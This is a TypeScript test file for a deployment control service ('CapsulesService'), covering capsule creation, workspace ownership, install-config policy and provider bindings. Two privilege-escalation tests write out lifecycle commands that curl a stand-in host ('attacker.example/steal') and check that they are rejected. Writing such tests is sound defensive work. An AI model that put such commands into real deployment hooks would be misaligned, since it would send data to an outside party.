import { expect, test } from "bun:test";

import { CapsulesService } from "../../../../core/domains/capsules/mod.ts";
import { stableJsonDigest } from "../../../../core/adapters/source/digest.ts";
import { InMemoryOpenTofuControlStore } from "../../../../core/domains/deploy-control/store.ts";
import type {
  OpenTofuControlStore,
  StoredSource,
} from "../../../../core/domains/deploy-control/store.ts";
import {
  CAPSULE_LIFECYCLE_COMMAND_CAPABILITY,
  INSTALL_CONFIG_PATCH_V1_KIND,
  type InstallConfig,
} from "takosumi-contract/install-configs";
import type { Workspace } from "takosumi-contract/workspaces";
import { withHistoricalPublicHostReservations } from "../../../helpers/deploy-control/historical_public_host_store.ts";

const NOW = "2026-06-06T00:00:00.000Z";

function build(
  store: OpenTofuControlStore = new InMemoryOpenTofuControlStore(),
) {
  let counter = 0;
  const newId = (prefix: string) =>
    `${prefix}_test${(counter += 1).toString().padStart(8, "0")}`;
  const service = new CapsulesService({
    store,
    newId,
    now: () => new Date(NOW),
  });
  return { store, service };
}

async function seedWorkspace(
  store: OpenTofuControlStore,
  over: Partial<Workspace> = {},
): Promise<Workspace> {
  const workspace: Workspace = {
    id: "ws_1",
    handle: "shota",
    displayName: "Shota",
    type: "personal",
    ownerUserId: "user_1",
    createdAt: NOW,
    updatedAt: NOW,
    ...over,
  };
  await store.putWorkspace(workspace);
  return workspace;
}

async function seedSource(
  store: OpenTofuControlStore,
  over: Partial<StoredSource> = {},
): Promise<StoredSource> {
  const source: StoredSource = {
    id: "src_1",
    workspaceId: "ws_1",
    name: "repo",
    url: "https://example.com/acme/repo.git",
    defaultRef: "release",
    defaultPath: "infra",
    status: "active",
    createdAt: NOW,
    updatedAt: NOW,
    hookSecretHash: "hash",
    autoSync: false,
    ...over,
  };
  await store.putSource(source);
  return source;
}

async function seedConfig(
  store: OpenTofuControlStore,
  over: Partial<InstallConfig> = {},
): Promise<InstallConfig> {
  const config: InstallConfig = {
    id: "cfg_1",
    name: "config",
    variableMapping: {},
    outputAllowlist: {},
    policy: {},
    createdAt: NOW,
    updatedAt: NOW,
    ...over,
  };
  await store.putInstallConfig(config);
  return config;
}

async function seedAll(store: OpenTofuControlStore): Promise<void> {
  await seedWorkspace(store);
  await seedSource(store);
  await seedConfig(store);
}

async function createCapsule(
  service: CapsulesService,
  over: Partial<Parameters<CapsulesService["createCapsule"]>[0]> = {},
) {
  return await service.createCapsule({
    workspaceId: "ws_1",
    name: "shop",
    environment: "production",
    sourceId: "src_1",
    installConfigId: "cfg_1",
    installingPrincipalId: "principal_installer",
    ...over,
  });
}

test("createCapsule persists the canonical Workspace, Project, and Capsule fields", async () => {
  const { store, service } = build();
  await seedAll(store);
  const capsule = await createCapsule(service);

  expect(capsule.id).toBe("cap_test00000001");
  expect(capsule.workspaceId).toBe("ws_1");
  expect(capsule.projectId).toStartWith("prj_");
  expect(capsule.slug).toBe("shop");
  expect(capsule.currentStateGeneration).toBe(0);
  expect(capsule.status).toBe("pending");
  expect(capsule.createdAt).toBe(NOW);
  expect((await store.getCapsule(capsule.id))?.name).toBe("shop");
});

test("createCapsule rejects an invalid name", async () => {
  const { store, service } = build();
  await seedAll(store);
  await expect(
    createCapsule(service, { name: "Shop Name" }),
  ).rejects.toMatchObject({ code: "invalid_argument" });
});

test("createCapsule rejects an unknown Workspace", async () => {
  const { store, service } = build();
  await seedSource(store);
  await seedConfig(store);
  await expect(
    createCapsule(service, { workspaceId: "ws_missing" }),
  ).rejects.toMatchObject({ code: "invalid_argument" });
});

test("createCapsule rejects a Source owned by another Workspace", async () => {
  const { store, service } = build();
  await seedWorkspace(store);
  await seedSource(store, { id: "src_other", workspaceId: "ws_other" });
  await seedConfig(store);
  await expect(
    createCapsule(service, { sourceId: "src_other" }),
  ).rejects.toMatchObject({ code: "invalid_argument" });
});

test("createCapsule rejects an unknown InstallConfig", async () => {
  const { store, service } = build();
  await seedWorkspace(store);
  await seedSource(store);
  await expect(
    createCapsule(service, { installConfigId: "cfg_missing" }),
  ).rejects.toMatchObject({ code: "invalid_argument" });
});

test("createCapsule enforces Workspace ownership for InstallConfig", async () => {
  const { store, service } = build();
  await seedWorkspace(store);
  await seedSource(store);
  await seedConfig(store, { id: "cfg_other", workspaceId: "ws_other" });
  await expect(
    createCapsule(service, { installConfigId: "cfg_other" }),
  ).rejects.toMatchObject({ code: "invalid_argument" });

  await seedConfig(store, { id: "cfg_workspace", workspaceId: "ws_1" });
  const capsule = await createCapsule(service, {
    installConfigId: "cfg_workspace",
  });
  expect(capsule.installConfigId).toBe("cfg_workspace");
});

test("createCapsule enforces the InstallConfig Source coordinate at the authority boundary", async () => {
  const { store, service } = build();
  await seedWorkspace(store);
  await seedSource(store);
  await seedConfig(store, {
    sourceSelector: {
      url: "https://example.com/acme/repo",
      path: "./infra/",
    },
  });

  const capsule = await createCapsule(service);
  expect(capsule.sourceId).toBe("src_1");

  await seedSource(store, {
    id: "src_other_repo",
    url: "https://example.com/acme/other.git",
  });
  await expect(
    createCapsule(service, {
      name: "other-repo",
      sourceId: "src_other_repo",
    }),
  ).rejects.toMatchObject({
    code: "invalid_argument",
    details: { reason: "install_config_source_mismatch" },
  });

  await seedSource(store, {
    id: "src_other_path",
    defaultPath: "other",
  });
  await expect(
    createCapsule(service, {
      name: "other-path",
      sourceId: "src_other_path",
    }),
  ).rejects.toMatchObject({
    code: "invalid_argument",
    details: { reason: "install_config_source_mismatch" },
  });
  await seedSource(store, {
    id: "src_query",
    url: "https://example.com/acme/repo.git?alternate=1",
  });
  await expect(
    createCapsule(service, {
      name: "query-source",
      sourceId: "src_query",
    }),
  ).rejects.toMatchObject({
    code: "invalid_argument",
    details: { reason: "install_config_source_mismatch" },
  });
  expect(
    await store.getCapsuleByName(capsule.projectId, "other-repo", "production"),
  ).toBeUndefined();
  expect(
    await store.getCapsuleByName(capsule.projectId, "other-path", "production"),
  ).toBeUndefined();
  expect(
    await store.getCapsuleByName(
      capsule.projectId,
      "query-source",
      "production",
    ),
  ).toBeUndefined();
});

test("createCapsule enforces unique Project, name, and environment", async () => {
  const { store, service } = build();
  await seedAll(store);
  await createCapsule(service);
  await expect(createCapsule(service)).rejects.toMatchObject({
    code: "failed_precondition",
  });
});

test("a destroyed Capsule does not reserve its former name", async () => {
  const { store, service } = build();
  await seedAll(store);
  const destroyed = await createCapsule(service);
  await store.putCapsule({ ...destroyed, status: "destroyed" });

  const replacement = await createCapsule(service);
  expect(replacement.id).not.toBe(destroyed.id);
  expect(replacement.status).toBe("pending");
});

test("abandonUnappliedCapsule closes the ledger and bindings without mutating historical host reservations", async () => {
  const baseStore = new InMemoryOpenTofuControlStore();
  let releaseCalls = 0;
  const store = withHistoricalPublicHostReservations(
    baseStore,
    [
      {
        hostname: "shop.app.example",
        ownerUserId: "user_1",
        workspaceId: "ws_1",
        capsuleId: "cap_test00000001",
        capsuleName: "shop",
        allocationKind: "scoped",
        status: "reserved",
        reservedAt: NOW,
        updatedAt: NOW,
      },
    ],
    { onRelease: () => (releaseCalls += 1) },
  );
  const { service } = build(store);
  await seedAll(store);
  const capsule = await createCapsule(service);
  expect(capsule.id).toBe("cap_test00000001");
  await store.putProviderBindingSet({
    id: "pbind_1",
    workspaceId: capsule.workspaceId,
    capsuleId: capsule.id,
    environment: capsule.environment,
    bindings: [
      {
        provider: "registry.opentofu.org/examplecorp/example",
        alias: "main",
        connectionId: "conn_example",
      },
    ],
    createdAt: NOW,
    updatedAt: NOW,
  });

  const abandoned = await service.abandonUnappliedCapsule(
    capsule.id,
    "test abandon",
  );

  expect(abandoned.status).toBe("destroyed");
  expect((await store.getCapsule(capsule.id))?.status).toBe("destroyed");
  expect(
    (await store.getPublicHostReservation("shop.app.example"))?.status,
  ).toBe("reserved");
  expect(releaseCalls).toBe(0);
  expect(
    await service.getProviderBindingSetByCapsule(
      capsule.id,
      capsule.environment,
    ),
  ).toBeUndefined();
  expect((await createCapsule(service)).id).not.toBe(capsule.id);
});

test("abandonUnappliedCapsule refuses a Capsule with applied state", async () => {
  const { store, service } = build();
  await seedAll(store);
  const capsule = await createCapsule(service);
  await store.patchCapsule(capsule.id, {
    currentStateGeneration: 1,
    updatedAt: "2026-06-06T00:01:00.000Z",
  });

  await expect(
    service.abandonUnappliedCapsule(capsule.id, "test abandon"),
  ).rejects.toMatchObject({ code: "failed_precondition" });
});

test("the same Capsule name can be used in another environment", async () => {
  const { store, service } = build();
  await seedAll(store);
  await createCapsule(service);
  const preview = await createCapsule(service, { environment: "preview" });
  expect(preview.environment).toBe("preview");
});

test("getCapsule, batched get, listCapsules, and patchCapsuleStatus use canonical ids", async () => {
  const { store, service } = build();
  await seedAll(store);
  await seedWorkspace(store, { id: "ws_2", handle: "other" });
  const capsule = await createCapsule(service);

  expect((await service.getCapsule(capsule.id)).id).toBe(capsule.id);
  expect(
    (await service.getCapsulesByIds([capsule.id, "cap_missing"])).map(
      (row) => row.id,
    ),
  ).toEqual([capsule.id]);
  expect((await service.listCapsules("ws_1")).map((row) => row.id)).toEqual([
    capsule.id,
  ]);
  expect(await service.listCapsules("ws_2")).toEqual([]);
  expect((await service.patchCapsuleStatus(capsule.id, "active")).status).toBe(
    "active",
  );
  await expect(service.getCapsule("cap_missing")).rejects.toMatchObject({
    code: "not_found",
  });
});

test("putInstallConfig requires an existing owning Workspace", async () => {
  const { service } = build();
  await expect(
    service.putInstallConfig({
      id: "cfg_x",
      workspaceId: "ws_missing",
      name: "x",
      variableMapping: {},
      outputAllowlist: {},
      policy: {},
      createdAt: NOW,
      updatedAt: NOW,
    }),
  ).rejects.toMatchObject({ code: "invalid_argument" });
});

test("putInstallConfig validates the operator-owned Source selector", async () => {
  const { service } = build();
  const base: InstallConfig = {
    id: "cfg_source_selector",
    name: "source-selector",
    variableMapping: {},
    outputAllowlist: {},
    policy: {},
    createdAt: NOW,
    updatedAt: NOW,
  };

  await expect(
    service.putInstallConfig({
      ...base,
      sourceSelector: {
        url: "https://example.test/acme/repo.git",
        path: "../outside",
      },
    }),
  ).rejects.toMatchObject({
    code: "invalid_argument",
    message: expect.stringContaining("sourceSelector.path"),
  });
  await expect(
    service.putInstallConfig({
      ...base,
      sourceSelector: { url: "bad\u0000url", path: "." },
    }),
  ).rejects.toMatchObject({
    code: "invalid_argument",
    message: expect.stringContaining("sourceSelector.url"),
  });
  await expect(
    service.putInstallConfig({
      ...base,
      sourceSelector: {
        url: "https://example.test/Acme/Repo.git",
        path: ".",
      },
    }),
  ).resolves.toMatchObject({ id: base.id });
});

test("putInstallConfig accepts explicit lifecycle actions and rejects missing policy", async () => {
  const { service } = build();
  const action = {
    apiVersion: "takosumi.dev/v1alpha1" as const,
    kind: "command" as const,
    id: "publish",
    phase: "post_apply" as const,
    executor: "runner" as const,
    command: ["bun", "run", "publish"],
    runnerCapability: CAPSULE_LIFECYCLE_COMMAND_CAPABILITY,
  };
  const base = {
    id: "cfg_actions",
    name: "actions",
    variableMapping: {},
    outputAllowlist: {},
    lifecycleActions: [action],
    createdAt: NOW,
    updatedAt: NOW,
  };

  await expect(
    service.putInstallConfig({ ...base, policy: {} }),
  ).rejects.toMatchObject({
    code: "invalid_argument",
    message: expect.stringContaining("policy.lifecycleActions"),
  });

  const config = await service.putInstallConfig({
    ...base,
    policy: {
      lifecycleActions: {
        allowedExecutors: ["runner"],
        allowedRunnerCapabilities: [CAPSULE_LIFECYCLE_COMMAND_CAPABILITY],
      },
    },
  });
  expect(config.lifecycleActions?.[0]?.id).toBe("publish");
});

test("a Workspace-owned InstallConfig cannot widen its own lifecycle action policy", async () => {
  const { store, service } = build();
  await seedWorkspace(store);
  // The per-install row inherits a runner-only grant from the shared config it
  // was cloned from. Widening it in the same write that installs the action
  // would be self-authorization: `validateLifecycleActions` only ever checks
  // the policy carried by that write.
  const stored = await seedConfig(store, {
    id: "icfg_scoped00000001",
    workspaceId: "ws_1",
    internal: { reason: "per_install_overrides" },
    policy: {
      lifecycleActions: {
        allowedExecutors: ["runner"],
        allowedRunnerCapabilities: [CAPSULE_LIFECYCLE_COMMAND_CAPABILITY],
      },
    },
  });

  await expect(
    service.putInstallConfig({
      ...stored,
      lifecycleActions: [
        {
          apiVersion: "takosumi.dev/v1alpha1",
          kind: "command",
          id: "activate",
          phase: "post_apply",
          executor: "operator",
          command: ["curl", "https://attacker.example/steal"],
          runnerCapability: CAPSULE_LIFECYCLE_COMMAND_CAPABILITY,
        },
      ],
      policy: {
        lifecycleActions: {
          allowedExecutors: ["runner", "operator"],
          allowedRunnerCapabilities: [CAPSULE_LIFECYCLE_COMMAND_CAPABILITY],
        },
      },
    }),
  ).rejects.toMatchObject({
    code: "permission_denied",
    message: expect.stringContaining("allowedExecutors"),
  });
});

test("a Workspace-owned InstallConfig cannot author a new operator lifecycle action", async () => {
  const { store, service } = build();
  await seedWorkspace(store);
  const inheritedAction = {
    apiVersion: "takosumi.dev/v1alpha1" as const,
    kind: "command" as const,
    id: "activate",
    phase: "post_apply" as const,
    executor: "operator" as const,
    command: ["bun", "scripts/control/takosumi-release.mjs", "production"],
    runnerCapability: CAPSULE_LIFECYCLE_COMMAND_CAPABILITY,
  };
  const policy = {
    lifecycleActions: {
      allowedExecutors: ["runner", "operator"] as const,
      allowedRunnerCapabilities: [CAPSULE_LIFECYCLE_COMMAND_CAPABILITY],
    },
  };
  const stored = await seedConfig(store, {
    id: "icfg_scoped00000002",
    workspaceId: "ws_1",
    internal: { reason: "per_install_overrides" },
    lifecycleActions: [inheritedAction],
    policy,
  });

  // The policy is unchanged and legitimately allows an operator executor, but
  // an operator action is run by the operator's release-activation webhook, so
  // the command itself may only be inherited verbatim.
  await expect(
    service.putInstallConfig({
      ...stored,
      lifecycleActions: [
        { ...inheritedAction, command: ["curl", "https://attacker.example"] },
      ],
    }),
  ).rejects.toMatchObject({ code: "permission_denied" });

  // Re-persisting the inherited action (and narrowing) stays allowed.
  const unchanged = await service.putInstallConfig(stored);
  expect(unchanged.lifecycleActions?.[0]?.id).toBe("activate");
});

test("repository-derived InstallConfigs reject patches without changing authority", async () => {
  const { store, service } = build();
  await seedWorkspace(store);
  await seedSource(store);

  const compiled = await seedConfig(store, {
    id: "icfg_compiled",
    workspaceId: "ws_1",
    internal: {
      reason: "per_install_overrides",
      sourceSnapshotId: "snap_compiled",
      repositoryInstallUxDigest: `sha256:${"a".repeat(64)}`,
    },
    variableMapping: { original: "compiled" },
  });
  const capsule = await createCapsule(service, {
    installConfigId: compiled.id,
  });
  const sealed = await seedConfig(store, {
    id: "icfg_re_adopted",
    workspaceId: "ws_1",
    internal: {
      reason: "per_install_overrides",
      sourceSnapshotId: "snap_re_adopted",
      repositoryInstallUxDigest: `sha256:${"b".repeat(64)}`,
      reAdoption: {
        capsuleId: capsule.id,
        actorSubject: "user_1",
        reason: "adopt reviewed repository setup",
        idempotencyKeyHash: `sha256:${"c".repeat(64)}`,
        requestDigest: `sha256:${"d".repeat(64)}`,
        previousInstallConfigId: "cfg_previous",
        previousInstallConfigDigest: `sha256:${"e".repeat(64)}`,
        previousCapsuleStatus: capsule.status,
        previousStateGeneration: capsule.currentStateGeneration,
        previousExecutionAuthorityEpoch: 1,
        authorityGuard: `sha256:${"f".repeat(64)}`,
        derivedTargetDigest: `sha256:${"1".repeat(64)}`,
        baseInstallConfigId: "cfg_base",
        sourceSnapshotId: "snap_re_adopted",
      },
    },
    variableMapping: { original: "re-adopted" },
  });

  let putCount = 0;
  const putInstallConfig = store.putInstallConfig.bind(store);
  store.putInstallConfig = async (config) => {
    putCount += 1;
    return await putInstallConfig(config);
  };
  const beforeCapsule = await service.getCapsule(capsule.id);
  const beforeEpoch = await service.getCapsuleExecutionAuthorityEpoch(
    capsule.id,
  );
  const patch = {
    kind: INSTALL_CONFIG_PATCH_V1_KIND,
    variableMapping: { changed: "must-not-persist" },
  };

  for (const row of [compiled, sealed]) {
    const before = await service.getInstallConfig(row.id);
    const beforeDigest = await stableJsonDigest(before);
    const beforeSeal = before.internal?.reAdoption?.derivedTargetDigest;
    await expect(service.applyInstallConfigPatch(row.id, patch)).rejects
      .toMatchObject({
        code: "failed_precondition",
        details: { reason: "repository_install_ux_immutable" },
        message: expect.stringContaining("compiled repository install configuration is immutable"),
      });
    expect(putCount).toBe(0);
    const after = await service.getInstallConfig(row.id);
    expect(after).toEqual(before);
    expect(await stableJsonDigest(after)).toBe(beforeDigest);
    expect(after.internal?.reAdoption?.derivedTargetDigest).toBe(beforeSeal);
  }

  expect(await service.getCapsule(capsule.id)).toEqual(beforeCapsule);
  expect(await service.getCapsuleExecutionAuthorityEpoch(capsule.id)).toBe(
    beforeEpoch,
  );

  const mutable = await seedConfig(store, {
    id: "icfg_mutable",
    workspaceId: "ws_1",
    internal: { reason: "per_install_overrides" },
  });
  putCount = 0;
  const mutableResult = await service.applyInstallConfigPatch(mutable.id, patch);
  expect(mutableResult.variableMapping).toEqual({ changed: "must-not-persist" });
  expect(putCount).toBe(1);

  const shared = await seedConfig(store, { id: "cfg_shared" });
  putCount = 0;
  const sharedResult = await service.applyInstallConfigPatch(shared.id, patch);
  expect(sharedResult.variableMapping).toEqual({ changed: "must-not-persist" });
  expect(putCount).toBe(1);
});

test("InstallConfig reads list only selectable service-side configuration", async () => {
  const { store, service } = build();
  await seedConfig(store);
  await seedConfig(store, {
    id: "icfg_0123456789abcdef",
    workspaceId: "ws_1",
    internal: { reason: "per_install_overrides" },
  });

  expect((await service.getInstallConfig("cfg_1")).name).toBe("config");
  expect((await service.listInstallConfigs()).map((row) => row.id)).toEqual([
    "cfg_1",
  ]);
  await expect(service.getInstallConfig("cfg_missing")).rejects.toMatchObject({
    code: "not_found",
  });
});

test("putProviderBindingSet validates the Capsule Workspace", async () => {
  const { store, service } = build();
  await seedAll(store);
  const capsule = await createCapsule(service);
  const bindingSet = await service.putProviderBindingSet({
    id: "pbind_1",
    workspaceId: "ws_1",
    capsuleId: capsule.id,
    environment: "production",
    bindings: [],
    createdAt: NOW,
    updatedAt: NOW,
  });
  expect(bindingSet.id).toBe("pbind_1");
  expect(
    await service.getProviderBindingSetByCapsule(capsule.id, "production"),
  ).toEqual(bindingSet);

  await expect(
    service.putProviderBindingSet({
      ...bindingSet,
      id: "pbind_bad",
      workspaceId: "ws_other",
    }),
  ).rejects.toMatchObject({ code: "invalid_argument" });

  await expect(
    service.putProviderBindingSet({
      ...bindingSet,
      id: "pbind_builtin",
      bindings: [
        {
          provider: "terraform.io/builtin/terraform",
          moduleLocalName: "terraform",
          connectionId: "conn_impossible",
        },
      ],
    }),
  ).rejects.toMatchObject({
    code: "invalid_argument",
    message: "OpenTofu builtin providers cannot have ProviderBindings",
  });
});
